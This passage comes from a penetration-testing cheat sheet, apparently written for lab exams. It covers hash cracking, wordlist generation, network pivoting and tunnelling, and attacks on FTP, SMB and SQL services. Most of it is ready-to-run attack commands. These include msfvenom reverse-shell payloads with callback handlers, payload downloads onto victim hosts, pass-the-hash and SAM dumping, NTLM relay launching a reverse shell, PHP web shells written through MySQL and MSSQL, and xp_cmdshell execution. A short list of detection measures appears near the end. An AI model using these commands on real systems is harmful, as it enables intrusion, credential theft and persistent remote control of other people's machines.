hashcat -m 500 'hash$' /home/kali/rockyou.txt // MD5crypt, MD5 (Unix)
hashcat -m 400 'hash$'/home/kali/rockyou.txt // Wordpress
```
Online crackers

```
https://hashkiller.co.uk/Cracker
https://www.cmd5.org/
https://www.onlinehashcrack.com/
https://gpuhash.me/
https://crackstation.net/
https://crack.sh/
https://hash.help/
https://passwordrecovery.io/
http://cracker.offensive-security.com/
```

### Wordlist Generation

#### Bash

##### Add Numbers to Password Segment

```shell
for i in {1..100}; do printf "Password@%d\n" $i >> <FILE>; done
```

#### CeWL

```shell
cewl -d 0 -m 5 -w <FILE> http://<RHOST>/index.php --lowercase
cewl -d 5 -m 3 -w <FILE> http://<RHOST>/index.php --with-numbers
```

#### CUPP

```shell
./cupp -i
```

#### crunch

```shell
crunch 9 9 -t foobar%%% > wordlist.txt
crunch 5 5 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ -o <FILE>.txt
```

#### JavaScript Quick Wordlist

```javascript
javascript:(function(){const e=document.documentElement.innerText.match(/[a-zA-Z_\-]+/g),n=[...new Set(e)].sort();document.open(),document.write(n.join("<br>")),document.close();})();
```

#### Mutate Wordlists

##### Find empty Passwords

```shell
grep -n '^$' /PATH/TO/WORDLIST/<WORDLIST>
```

##### Remove all Number Sequences

```shell
head /PATH/TO/WORDLIST/<WORDLIST> > <FILE>.txt
sed -i '/^1/d' <FILE>.txt
```

#### Username Anarchy

```shell
./username-anarchy -f first,first.last,last,flast,f.last -i <FILE>
```

## 8. Pivoting, Tunneling & Port Forwarding

### SSH Local Port Forwarding

```
# netstat -r or ip route.
# Executing the Local Port Forward:---> We have seen local port forwarding, where SSH can listen on our local host and forward a service on the remote host to our port
ssh -L AnyLocalPort:localhost:DestinationPort username@DestinationIP
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64  --> Forwarding Multiple Ports

ssh -L localhost:AnyLocalPort:DestinationIP:DestinationPort username@<JUmServerIP/MIddleServerIP>
ssh -L AnyLocalPort:localhost:DestinationPort -L AnyLocalPort2:localhost:DestinationPort2 username@DestinationIP

# To Verify the local port forwarding
netstat -antp | grep 1234
nmap -v -sV -pLocalPort localhost
```

#### Chisel

| System             | IP address     |
| ------------------ | -------------- |
| LHOST              | 192.168.50.10  |
| APPLICATION SERVER | 192.168.100.10 |
| DATABASE SERVER    | 10.10.100.20   |
| WINDOWS HOST       | 172.16.50.10   |

#### Reverse Pivot

- LHOST < APPLICATION SERVER

#### LHOST

```shell
./chisel server -p 9002 -reverse -v
```

#### APPLICATION SERVER

```shell
./chisel client 192.168.50.10:9002 R:3000:127.0.0.1:3000
```

#### SOCKS5 / Proxychains Configuration

- LHOST > APPLICATION SERVER > NETWORK

**LHOST**

**APPLICATION SERVER**

```shell
./chisel client 192.168.50.10:9002 R:socks
```

#### Ligolo-ng

#### Download Proxy and Agent

```shell
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_Linux_64bit.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_Linux_64bit.tar.gz
```

#### Prepare Tunnel Interface

#### Setup Proxy on LHOST

#### Setup Agent on APPLICATION SERVER

#### Configure Session

#### Port Forwarding

- LHOST < APPLICATION SERVER > DATABASE SERVER

```shell
[Agent : user@target] » listener_add --addr 10.10.100.20:2345 --to 192.168.50.10:2345 --tcp
```

#### Socat

- LHOST > APPLICATION SERVER > DATABASE SERVER

**APPLICATION SERVER**

```shell
ip a
ip r
socat -ddd TCP-LISTEN:2345,fork TCP:<RHOST>:5432
```

**LHOST**

```shell
psql -h <RHOST> -p 2342 -U postgres
```

#### SSH Tunneling

#### Local Port Forwarding

| --- | --- |

- LHOST > APPLICATION SERVER > DATABASE SERVER > WINDOWS HOST

**APPLICATION SERVER**

```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
ssh <USERNAME>@192.168.100.10
for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445;
ssh -N -L 0.0.0.0:4455:172.16.50.10:445 <USERNAME>@10.10.100.20
```

**LHOST**

```shell
smbclient -p 4455 //172.16.50.10/<SHARE> -U <USERNAME> --password=<PASSWORD>
```

#### Dynamic Port Forwarding

**APPLICATION SERVER**

```shell
ssh -N -D 0.0.0.0:9999 <USERNAME>@10.10.100.20
```

**LHOST**

```shell
sudo ss -tulpn
tail /etc/proxychains4.conf
socks5 192.168.50.10 9999
proxychains smbclient -p 4455 //172.16.50.10/<SHARE> -U <USERNAME> --password=<PASSWORD>
```

#### Remote Port Forwarding

- LHOST <-> FIREWALL <-> APPLICATION SERVER > DATABASE SERVER > WINDOWS HOST

**LHOST**

```shell
sudo systemctl start ssh
```

**APPLICATION SERVER**

```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -R 127.0.0.1:2345:10.10.100.20:5432 <USERNAME>@192.168.50.10
```

**LHOST**

```shell
psql -h 127.0.0.1 -p 2345 -U postgres
```

#### Remote Dynamic Port Forwarding

- LHOST < FIREWALL < APPLICATION SERVER > NETWORK

**APPLICATION SERVER**

```shell
ssh -N -R 9998 <USERNAME>@192.168.50.10
```

**LHOST**

```shell
socks5 127.0.0.1 9998
proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.10.100.20
```

#### sshuttle

**APPLICATION SERVER**

```shell
socat TCP-LISTEN:2222,fork TCP:10.10.100.20:22
```

**LHOST**

```shell
sshuttle -r <USERNAME>@192.168.100.10:2222 10.10.100.0/24 172.16.50.0/24
smbclient -L //172.16.50.10/ -U <USERNAME> --password=<PASSWORD>
```

#### ssh.exe

| ------------------- | -------------- |
| WINDOWS JUMP SERVER | 192.168.100.20 |

- LHOST < FIREWALL < WINDOWS JUMP SERVER > NETWORK

**LHOST**

```shell
xfreerdp3 /u:<USERNAME> /p:<PASSWORD> /v:192.168.100.20
```

#### WINDOWS JUMP SERVER

```shell
where ssh
C:\Windows\System32\OpenSSH\ssh.exe
```

**LHOST**

```shell
ss -tulpn
proxychains psql -h 10.10.100.20 -U postgres
```

#### Plink

- LHOST < FIREWALL < WINDOWS JUMP SERVER

**LHOST**

```shell
find / -name plink.exe 2>/dev/null
/usr/share/windows-resources/binaries/plink.exe
```

**WINDOWS JUMP SERVER**

```cmd
plink.exe -ssh -l <USERNAME> -pw <PASSWORD> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.50.10
```

**LHOST**

```shell
xfreerdp3 /u:<USERNAME> /p:<PASSWORD> /v:127.0.0.1:9833
```

#### Netsh

- LHOST < FIREWALL < WINDOWS JUMP SERVER > DATABASE SERVER

**LHOST**

**WINDOWS JUMP SERVER**

```cmd
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.10 connectport=22 connectaddress=10.10.100.20
netstat -anp TCP | findstr "2222"
netsh interface portproxy show all
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.10 localport=2222 action=allow
```

**LHOST**

```shell
sudo nmap -sS 192.168.50.10 -Pn -n -p2222
ssh database_admin@192.168.50.10 -p2222
```

**WINDOWS JUMP SERVER**

```cmd
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.10
```

### SSH Dynamic Port Forwarding (SOCKS)

<img width="2108" height="1184" alt="22" src="https://github.com/user-attachments/assets/aa4019a7-fc9f-497f-b9c7-d537936f17f3" />

```
# Enabling Dynamic Port Forwarding with SSH:---> dynamic port forwarding, where we can send packets to a remote network via a pivot host.
1) ssh -D AnyLocalPort(9050) username@DestinationIP
2) Checking /etc/proxychains.conf
tail -4 /etc/proxychains.conf
	# meanwhile
	# defaults set to "tor"
	socks4 	127.0.0.1 9050

# Now when you start Nmap with proxychains using the command below, it will route all the packets of Nmap to the local port 9050, where our SSH client is listening, which will forward all the packets over SSH to the 172.16.5.0/23 network.
3) Using Nmap with Proxychains (SOCKS tunneling
	proxychains nmap -v -sn 172.16.5.1-200

	# Enumerating the Windows Target through Proxychains (Windows Defender firewall blocks ICMP requests (traditional pings) by default.)
	proxychains nmap -v -Pn -sT 172.16.5.19
	proxychains4 -f /home/kali/recon/proxychains.conf nmap -v -Pn -sT 172.16.5.19

# Using Metasploit with Proxychains
proxychains msfconsole
msf6 > search rdp_scanner
msf6 > use 0

# Using xfreerdp with Proxychains
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:<PASSWORD>

```

### SSH Remote/Reverse Port Forwarding

```
#Creating a Windows Payload with msfvenom
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080

#Configuring & Starting the multi/handler
use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0(ourhackingmachine)
msf6 exploit(multi/handler) > set lport 8000(listenByOurHackingMachinePort)
msf6 exploit(multi/handler) > run

#Transferring Payload to Pivot Host
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/

# Starting Python3 Webserver on Pivot Host to make windows target machine access http download url from pivot machine
python3 -m http.server 8123

#Downloading Payload on the Windows Target
PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"

# Using SSH -R |  Remote/Reverse Port Forwarding with SSH  --> The -R command asks the Ubuntu server to listen on <targetIPaddress>:8080 and forward all incoming connections on port 8080 to our msfconsole listener on 0.0.0.0:8000 of our attack host.
>$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN

Once we have our payload downloaded on the Windows host, we will use SSH remote port forwarding to forward connections from the Ubuntu server's port 8080 to our msfconsole's listener service on port 8000. We will use -vN argument in our SSH command to make it verbose and ask it not to prompt the login shell. The -R command asks the Ubuntu server to listen on <targetIPaddress>:8080 and forward all incoming connections on port 8080 to our msfconsole listener on 0.0.0.0:8000 of our attack host.

```

### Meterpreter Tunneling & Port Forwarding

```
# we would like to take advantage of the conveniences that Meterpreter sessions bring us. In such cases, we can still create a pivot with our Meterpreter session without relying on SSH port forwarding. We can create a Meterpreter shell for the Ubuntu server with the command below, which will return a shell on our attack host on port 8080.
# Creating Payload for Ubuntu Pivot Host
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080

# Before copying the payload over, we can start a multi/handler, also known as a Generic Payload Handler.
# Configuring & Starting the multi/handler
msf6 > use exploit/multi/handler
set lhost 0.0.0.0
set lport 8080
set payload linux/x64/meterpreter/reverse_tcp
run

# We can copy the backupjob binary file to the Ubuntu pivot host over SSH and execute it to gain a Meterpreter session.
	-> ls
	-> chmod +x backupjob
	-> ./backupjob

# Meterpreter Session Establishment
meterpreter > pwd

#  **firewall allowing ping (ICMP) **
# Ping Sweep
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
# OR
for linux
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
# OR
for windows cmd
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
# OR
for windows powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}

#  **IF firewall blocks ping (ICMP) **
# In these cases, we can perform a TCP scan on the 172.16.5.0/23 network with Nmap. Instead of using SSH for port forwarding, we can also use Metasploit's post-exploitation routing module socks_proxy to configure a local proxy on our attack host. We will configure the SOCKS proxy for SOCKS version 4a. This SOCKS configuration will start a listener on port 9050 and route all the traffic received via our Meterpreter session.
# Configuring MSF's SOCKS Proxy
	-> meterpreter > bg
	-> use auxiliary/server/socks_proxy
	-> set SRVPORT 9050
	-> set SRVHOST 0.0.0.0
	-> set version 4a
	-> run
	-> options
	-> jobs

# After initiating the SOCKS server, we will configure proxychains to route traffic generated by other tools like Nmap through our pivot on the compromised Ubuntu host. We can add the line below at the end of our proxychains.conf file located at /etc/proxychains.conf if it isn't already there.
# Adding a Line to proxychains.conf if Needed
-> socks4  127.0.0.1 9050

# Finally, we need to tell our socks_proxy module to route all the traffic via our Meterpreter session. We can use the post/multi/manage/autoroute module from Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.
# Creating Routes with AutoRoute
msf6 > use post/multi/manage/autoroute
> set SESSION 1
> set SUBNET 172.16.5.0
> run

# It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.
meterpreter > sessions -i 1
meterpreter > run autoroute -s 172.16.5.0/23

# Listing Active Routes with AutoRoute (After adding the necessary route(s) we can use the -p option to list the active routes to make sure our configuration is applied as expected.
)
meterpreter > run autoroute -p

# Testing Proxy & Routing Functionality
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn

----------------------------------------------------------------------------
# Port Forwarding with Meterpreter
# Port forwarding can also be accomplished using Meterpreter's portfwd module. We can enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter session to a remote host on the 172.16.5.0/23 network.
meterpreter > help portfwd
# Creating Local TCP Relay (The command below requests the Meterpreter session to start a listener on our attack host's local port (-l) 3300 and forward all the packets to the remote (-r) Windows server 172.16.5.19 on 3389 port (-p) via our Meterpreter session. Now, if we execute xfreerdp on our localhost:3300, we will be able to create a remote desktop session.)
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19

# Connecting to Windows Target through localhost
xfreerdp /v:localhost:3300 /u:victor /p:<PASSWORD>

netstat -antp

----------------------------------------------------------------------------
# Meterpreter Reverse Port Forwarding
# We can create a reverse port forward on our existing shell from the previous scenario using the command below. This command forwards all connections on port 1234 running on the Ubuntu server to our attack host on local port (-l) 8081. We will also configure our listener to listen on port 8081 for a Windows shell.
# Reverse Port Forwarding Rules
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

# Configuring & Starting multi/handler
meterpreter > bg
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
> set LPORT 8081
> set LHOST 0.0.0.0
> run
# We can now create a reverse shell payload that will send a connection back to our Ubuntu server on 172.16.5.129:1234 when executed on our Windows host. Once our Ubuntu server receives this connection, it will forward that to attack host's ip:8081 that we configured.

# Generating the Windows Payload
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234

# Finally, if we execute our payload on the Windows host, we should be able to receive a shell from Windows pivoted via the Ubuntu server.
# Establishing the Meterpreter session
meterpreter > shell

```

### Socat Redirection — Reverse Shell

```
# We can start Metasploit's listener using the same command mentioned in the last section on our attack host, and we can start socat on the Ubuntu(pivot) server.
# Starting Socat Listener on a Ubuntu(pivot) server.
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80

# Socat will listen on localhost on port 8080 and forward all the traffic to port 80 on our attack host (10.10.14.18).
# Creating the Windows Payload from our attack host
user@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080

# Configuring & Starting the multi/handler on our attack host
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 80
 run
```

### Socat Redirection — Bind Shell

```
# We can create a bind shell payload for Windows and execute it on the Windows host. At the same time, we can create a socat redirector on the Ubuntu server, which will listen for incoming connections from a Metasploit bind handler and forward that to a bind shell payload on a Windows target.
# Creating the Windows Payload
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443

# Starting Socat Bind Shell Listener on a Ubuntu(pivot) server.
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443

# Configuring & Starting the Bind multi/handler on our attacker host
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST 10.129.202.64
set LPORT 8080
run
```

### Rpivot

```
attack machine -> git clone https://github.com/klsecservices/rpivot.git
attack machine -> python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
attack machine -> scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/

Pivot machine -> python2 client.py --server-ip 10.10.14.18 --server-port 9999

attack machine -> configure proxychains
attack machine -> proxychains nmap IP -pPort
attack machine -> proxychains firefox-esr 172.16.5.135:80
attack machine -> proxychains curl --noproxy '*' http://172.16.5.135:80

### Windows Port Forwarding

Run in victim:
`cmd.exe /c echo y | plink.exe -ssh -l kali -pw <PASSWORD> -R 10.10.16.155:1445:127.0.0.1:445 10.10.16.155` #Opens port 1445 on kali to 445 on victim

`plink -l LOCALUSER -pw LOCALPASSWORD LOCALIP -R 5985:127.0.0.1:5985 -P 221`

`plink.exe -l kali -pw <PASSWORD> -R 8080:127.0.0.1:445 10.10.16.155`

`ssh -l kali -pw <PASSWORD> -R 445:127.0.0.1:445 10.10.16.155` #port forward

#NETSH PORT FWD
***IP Helper Svc and IPv6 Support must be enabled (default on Windows)***
`netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110` #Opens 4455 on Win client to fwd 445 to dest client
`netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow` #ALlow inbound connections on 4455
#On kali make sure '/etc/samba/smb.conf' is set to 'min protocol = SMB2' before connecting

### Linux Port Forwarding

#Socks Proxy

`sudo sshuttle -r sean@10.11.1.251 10.1.1.0/24 -v` ## Requires PW of user; Socks Proxy to entire subnetwork from kali

`ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i id_rsa kali@192.168.119.137`  #Run on victim

`proxychains nmap --top-ports=20 -sT -Pn 10.1.1.68`  #Make sure "sT" & "Pn" is configured when ran from kali & proxy port is in /etc/proxychains.conf file

#Remote Port Forward:


`from="10.11.1.250",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa ssh-rsa <id_rsa.pub result>`  #Placed in kali known_hosts/authorized_keys file

`ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/thunda/id_rsa kali@192.168.119.209`  #CMD ran in victim for port fwd

`mysql --host=127.0.0.1 --port=13306 --user=wp -p`  #Connection using port forward

### Connecting to a Web Server using HTTP-Proxy & NTLM Auth

This covers scenarios where we cannot directly pivot to an external server (attack host) in the cloud. Some organizations configure an HTTP proxy with NTLM authentication on the Domain Controller; in such cases rpivot can supply additional NTLM credentials. Use rpivot client.py as shown below.

Pivot machine -> python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>

```

### Windows netsh Port Proxy

```
- 10.10.16.83 #kali ip
- ( 10.129.42.198 # Windows public IP and 172.16.5.150 # Windows private IP)
- 172.16.5.19 # DC01/victor machine

# from windows public IP (after pwn the pivot host)
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.19
# Verifying Port Forward from the pwn the pivot host
netsh.exe interface portproxy show v4tov4

# then go to the attacker host
xfreerdp /v:10.129.42.198:8080 /u:victor /p:<PASSWORD>

```

### Dnscat2 DNS Tunneling

```
# from attack host (server side):-
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler
sudo bundle install
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache

# Then cloning the client script to attack host too.
git clone https://github.com/lukebaggett/dnscat2-powershell.git

# copy the dnscat2-powershell.py script to the pivot host or the victim host

# from pivot/victim host (client side):-
- Import-Module .\dnscat2.ps1
- Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret <PRE_SHARED_SECRET> -Exec cmd
		dnscat2> ?
		dnscat2> window -i 1
```

### Chisel SOCKS5

#### Build and Serve

```bash
git clone https://github.com/jpillora/chisel.git
cd chisel
go build
# OR static build
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o chisel_static
file chisel_static
scp chisel ubuntu@10.129.202.64:~/
```

#### Reverse SOCKS Proxy (Pivot as Server)

```bash
# On the pivot host
./chisel server -v -p 1234 --socks5

# On the attack host
./chisel client -v 10.129.202.64:1234 socks
```

Point proxychains at the local SOCKS listener:

```bash
sudo nano /etc/proxychains4.conf
# socks4 127.0.0.1 9050
socks5 127.0.0.1 1080
```

```bash
proxychains xfreerdp /v:172.16.5.19 /u:<USER> /p:'<PASSWORD>'
```

#### Chisel Reverse Pivot (Attack Host as Server)

Use this when firewall rules block inbound connections to the pivot.

```bash
# Attack host
sudo ./chisel server --reverse -v -p 1234 --socks5

# Pivot host
./chisel client -v 10.10.14.17:1234 R:socks
```

Confirm proxychains:

```bash
tail -f /etc/proxychains.conf
# socks4 127.0.0.1 9050
socks5 127.0.0.1 1080
```

```bash
proxychains xfreerdp /v:172.16.5.19 /u:<USER> /p:'<PASSWORD>'
```

### ICMP Tunneling (ptunnel-ng)

```
# Run these commands on your attacker machine, not on the pivot.
sudo apt update
sudo apt install -y git build-essential automake autoconf
git clone https://github.com/utoni/ptunnel-ng.git
cd ptunnel-ng
sudo ./autogen.sh
ls -l src/ptunnel-ng

# Transfer the files to the pivot
scp -r ptunnel-ng ubuntu@10.129.202.64:~/

# Step 4 — Start the ICMP tunnel server on the pivot
cd ~/ptunnel-ng/src
sudo ./ptunnel-ng -r10.129.202.64 -R22

# Step 5 — Start the tunnel client on the attacker
cd ~/ptunnel-ng/src
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22

# Step 6 — Test SSH through the tunnel
ssh -p 2222 -l ubuntu 127.0.0.1
# OR
ssh -D 9050 -p 2222 -l ubuntu 127.0.0.1

# Step 7 — Configure ProxyChains
sudo nano /etc/proxychains4.conf
socks5 127.0.0.1 9050

# Step 8 — Test access to the internal RDP port
proxychains nmap -sV 172.16.5.19 -p3389
proxychains4 nmap -sT -Pn -n -sV -p 3389 172.16.5.19

# Connect to RDP
proxychains xfreerdp /v:172.16.5.19
proxychains4 xfreerdp /v:172.16.5.19 /u:USERNAME

```

### Windows & Additional Pivoting

`plink.exe` (PuTTY's Windows SSH client):

```cmd
plink.exe -ssh -D 9050 <USER>@<PIVOT>
plink.exe -ssh -R 8080:127.0.0.1:80 <USER>@<PIVOT>
```

`sshuttle` (VPN-like forwarding over SSH, no SOCKS proxy):

```bash
sudo apt-get install sshuttle
sudo sshuttle -r <USER>@<PIVOT> <INTERNAL_SUBNET> -v
sudo nmap -v -A -sT -p3389 <INTERNAL_IP> -Pn
```

SocksOverRDP (SOCKS over an RDP session):

```cmd
regsvr32.exe SocksOverRDP-Plugin.dll
netstat -antb | findstr 1080
```

Then point proxychains at `127.0.0.1:1080`. Use the matching SocksOverRDP client on the attack host.

Detection and prevention:

- Egress filtering and allowlists for outbound SSH/RDP.
- Proxy/DNS logs, anomalous long-lived connections, and tunnels over unusual ports.
- Restrict SSH forwarding (`AllowTcpForwarding no`), disable unused RDP, and monitor for `plink`/`sshuttle` binaries.
- Network segmentation and host-based firewall rules.

## 9. Attacking Common Services

### Service Misconfigurations & Sensitive Information

Common service misconfigurations:

| Service | Checks |
|---|---|
| FTP | Anonymous login, writable directories, version CVEs |
| SMB | Null sessions, guest access, share permissions, signing |
| SQL | Default/weak `sa`, `xp_cmdshell`, linked servers |
| RDP | NLA, weak credentials, BlueKeep-style CVEs |
| DNS | Zone transfers, recursion, cache poisoning |
| SMTP | Open relay, user enumeration (VRFY/RCPT) |
| SNMP | Default community strings, readable OIDs |
| NFS | `no_root_squash`, world-readable exports |

Finding sensitive information:

```bash
# Service banners and versions
nmap -sV -sC -p- <TARGET>

# Web/config/backup files
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ \
  -u http://<TARGET>/FUZZ -e .bak,.old,.zip,.config,.env

# Anonymous shares
smbclient -N -L //<TARGET>
```

Check discovered versions against CVEs (`searchsploit <product> <version>`, NVD, vendor advisories) and validate the exploit before running it. Default credentials and anonymous access are common findings; document them with evidence.

### FTP

```
# Brute Forcing
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
hydra -L users.txt -P passwords.txt -s 21 ftp://10.1.1.1

# FTP Bounce Attack
nmap -Pn -v -n -p80 -b anonymous:<PASSWORD>@10.10.110.213 172.17.0.2
```

### SMB

```
# Null-session with the rpcclient.
rpcclient -U'%' 10.10.110.17

# Execute a command over the SMB service using crackmapexec.
crackmapexec smb 10.10.110.17 -u Administrator -p '<PASSWORD>' -x 'whoami' --exec-method smbexec
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p '<PASSWORD>' --local-auth
impacket-psexec administrator:'<PASSWORD>'@10.10.110.17

# Enumerating Logged-on Users
crackmapexec smb 10.10.110.0/24 -u administrator -p '<PASSWORD>' --loggedon-users

# Extract hashes from the SAM database.
crackmapexec smb 10.10.110.17 -u administrator -p '<PASSWORD>' --sam

# Pass-the-Hash (PtH) Technique
crackmapexec smb 10.10.110.17 -u Administrator -H <NTLM_HASH>

# Dump the SAM database using impacket-ntlmrelayx.
cat /etc/responder/Responder.conf | grep 'SMB ='
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

# Execute a PowerShell based reverse shell using impacket-ntlmrelayx.
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>
```

### SQL (MySQL & MSSQL)

```
# SQLEXPRESS
EXECUTE sp_configure 'show advanced options', 1
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE
xp_cmdshell 'whoami'

# MySQL - Write Local File
SELECT @@version_compile_os;
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
# MySQL - Secure File Privileges
show variables like "secure_file_priv";

# MSSQL - Enable Ole Automation Procedures
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO

# MSSQL - Create a File
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO

# Read Local Files
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
# MySQL - Read Local Files in MySQL
mysql> select LOAD_FILE("/etc/passwd");
mysql> SELECT LOAD_FILE("C:/Users/Administrator/Desktop/flag.txt");

# Hash stealing using the xp_dirtree command in MSSQL.
EXEC master..xp_dirtree '\\10.10.110.17\share\'

# Hash stealing using the xp_subdirs command in MSSQL.
EXEC master..xp_subdirs '\\10.10.110.17\share\'

# Retrieve the hash
sudo responder -I tun0
sudo impacket-smbserver share ./ -smb2support

# Identify Users that We Can Impersonate
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

# Verifying our Current User and Role
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

# Impersonating the SA User
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

# Identify linked Servers in MSSQL
SELECT srvname, isremote FROM sysservers

# Identify the user and its privileges used for the remote connection in MSSQL.
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
```

**Connection**

```shell
sqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>'
impacket-mssqlclient <USERNAME>:<PASSWORD>@<RHOST> -windows-auth
```

**Common Commands**

```shell
SELECT @@version;
SELECT name FROM sys.databases;
SELECT * FROM <DATABASE>.information_schema.tables;
SELECT * FROM <DATABASE>.dbo.users;
```

#### Show Database Content

```shell
1> SELECT name FROM master.sys.databases
2> go
```

#### OPENQUERY

```shell
1> select * from openquery("web\clients", 'select name from master.sys.databases');
```

```shell
1> select * from openquery("web\clients", 'select name from clients.sys.objects');
```

#### Binary Extraction as Base64

```shell
1> select cast((select content from openquery([web\clients], 'select * from clients.sys.assembly_files') where assembly_id = 65536) as varbinary(max)) for xml path(''), binary base64;
2> go > export.txt
```

#### Steal NetNTLM Hash / Relay Attack

```shell
SQL> exec master.dbo.xp_dirtree '\\<LHOST>\FOOBAR'
```

#### Linked SQL Server Enumeration

```shell
SQL> SELECT user_name();
SQL> SELECT name,sysadmin FROM syslogins;
SQL> SELECT srvname,isremote FROM sysservers;
SQL> EXEC ('SELECT current_user') at [<DOMAIN>\<CONFIG_FILE>];
SQL> EXEC ('SELECT srvname,isremote FROM sysservers') at [<DOMAIN>\<CONFIG_FILE>];
SQL> EXEC ('EXEC (''SELECT suser_name()'') at [<DOMAIN>\<CONFIG_FILE>]') at [<DOMAIN>\<CONFIG_FILE>];
```

#### xp_cmdshell

```shell
SQL> EXECUTE AS LOGIN = 'sa';
SQL> EXEC sp_configure 'Show Advanced Options', 1;
SQL> RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1;
SQL> EXEC xp_cmdshell 'dir';
```

```shell
